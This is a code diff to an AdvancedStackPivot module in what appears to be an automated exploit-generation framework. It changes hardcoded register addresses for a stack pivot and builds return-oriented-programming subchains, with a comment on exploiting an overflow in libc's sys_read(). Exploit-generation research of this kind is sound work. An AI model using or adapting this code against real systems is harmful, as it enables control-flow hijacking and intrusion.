@@ -122,19 +122,21 @@ void AdvancedStackPivot::initialize() {
     assert(__dynRop && "AdvancedStackPivot relies on DynamicRop module");
     auto &dynRop = *__dynRop;
 
-    ref<Expr> rbp1 = ConstantExpr::create(0x404840, Expr::Int64);
-    ref<Expr> rip1 = ConstantExpr::create(0x401180, Expr::Int64);
+    ref<Expr> rbp1 = ConstantExpr::create(0x404830, Expr::Int64);
+    ref<Expr> rip1 = ConstantExpr::create(0x40112e, Expr::Int64);
 
     dynRop.addConstraint(DynamicRop::RegisterConstraint { Register::X64::RBP, rbp1 })
         .addConstraint(DynamicRop::RegisterConstraint { Register::X64::RIP, rip1 })
         .scheduleConstraints();
 
-    ref<Expr> rbp2 = ConstantExpr::create(0x404840 + 8 + 32, Expr::Int64);
-    ref<Expr> rip2 = ConstantExpr::create(0x401180, Expr::Int64);
+    ref<Expr> rbp2 = ConstantExpr::create(0x404830 + 8 + 32, Expr::Int64);
+    ref<Expr> rip2 = ConstantExpr::create(0x40112e, Expr::Int64);
 
     dynRop.addConstraint(DynamicRop::RegisterConstraint { Register::X64::RBP, rbp2 })
         .addConstraint(DynamicRop::RegisterConstraint { Register::X64::RIP, rip2 })
         .scheduleConstraints();
+
+    g_crax->setShowInstructions(true);
 
     // At this point, the exploit generator is already running.
     // This is our last chance to stop it. This method will throw a
@@ -209,12 +211,20 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
 
 
     std::vector<RopSubchain> ret;
+
+    // Symbolic ROP subchain
+    // We're exploiting the overflow in libc's sys_read(),
+    // so constraint solver isn't needed.
+    ret.push_back({});
+
+    // Direct ROP subchain
     for (size_t i = 0; i < part1.size(); i += 6) {
         ret.push_back(RopSubchain(part1.begin() + i, part1.begin() + i + 6));
     }
     for (size_t i = 0; i < part2.size(); i += 6) {
         ret.push_back(RopSubchain(part2.begin() + i, part2.begin() + i + 6));
     }
+
     return ret;
 }
 
